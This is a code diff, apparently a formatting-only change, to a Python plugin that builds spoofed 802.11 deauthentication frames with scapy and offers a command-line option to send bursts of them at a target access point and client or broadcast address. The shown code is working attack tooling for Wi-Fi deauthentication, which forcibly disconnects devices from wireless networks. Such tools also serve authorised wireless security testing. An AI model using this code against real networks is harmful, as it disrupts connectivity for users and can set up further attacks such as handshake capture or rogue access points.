@@ -23,12 +23,17 @@ def _build_frame(*, src_bssid: str, dst: str) -> Any:
     """Construct one RadioTap+Dot11 deauth frame. Reason 7 = class-3 frame."""
     import scapy.all as s
 
-    return s.RadioTap() / s.Dot11(
-        type=0, subtype=12,
-        addr1=dst,
-        addr2=src_bssid,
-        addr3=src_bssid,
-    ) / s.Dot11Deauth(reason=7)
+    return (
+        s.RadioTap()
+        / s.Dot11(
+            type=0,
+            subtype=12,
+            addr1=dst,
+            addr2=src_bssid,
+            addr3=src_bssid,
+        )
+        / s.Dot11Deauth(reason=7)
+    )
 
 
 class DeauthPlugin(Plugin):
@@ -40,7 +45,9 @@ class DeauthPlugin(Plugin):
         @group.command(name=self.name, help="Send a burst of deauth frames")
         @click.option("--target", "-t", required=True, help="AP BSSID to spoof")
         @click.option(
-            "--client", "-c", required=True,
+            "--client",
+            "-c",
+            required=True,
             help="Target STA MAC or 'broadcast'",
         )
         @click.option("--count", "-n", default=8, show_default=True, type=int)
